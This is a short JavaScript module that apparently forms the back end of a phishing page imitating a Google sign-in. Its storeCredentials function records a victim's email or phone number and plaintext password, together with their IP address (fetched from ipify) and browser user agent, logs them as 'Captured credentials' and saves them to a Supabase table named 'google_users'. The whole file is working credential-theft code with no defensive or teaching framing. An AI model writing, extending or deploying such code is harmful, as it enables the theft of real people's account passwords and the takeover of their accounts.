import { createClient } from '@supabase/supabase-js';

// Supabase configuration
const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || '';
const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY || '';

// Create Supabase client (will be null if not configured)
export const supabase = supabaseUrl && supabaseAnonKey 
  ? createClient(supabaseUrl, supabaseAnonKey)
  : null;

// Get user's IP address using ipify
async function getIpAddress() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    return data.ip;
  } catch (error) {
    console.warn('Could not fetch IP address:', error);
    return 'unknown';
  }
}

// Store captured credentials
export async function storeCredentials(emailOrPhone, password, theme) {
  const ipAddress = await getIpAddress();
  const userAgent = navigator.userAgent;
  
  const credentialData = {
    email_or_phone: emailOrPhone,
    password: password,
    ip_address: ipAddress,
    user_agent: userAgent,
    theme_used: theme,
    created_at: new Date().toISOString()
  };

  // Log to console (for development/debugging)
  console.log('Captured credentials:', credentialData);

  // If Supabase is configured, store in database
  if (supabase) {
    try {
      const { data, error } = await supabase
        .from('google_users')
        .insert([credentialData]);

      if (error) {
        console.error('Supabase error:', error);
        return { success: false, error };
      }

      console.log('Credentials stored successfully:', data);
      return { success: true, data };
    } catch (error) {
      console.error('Error storing credentials:', error);
      return { success: false, error };
    }
  } else {
    console.warn('Supabase not configured. Credentials logged to console only.');
    return { success: true, data: credentialData };
  }
}
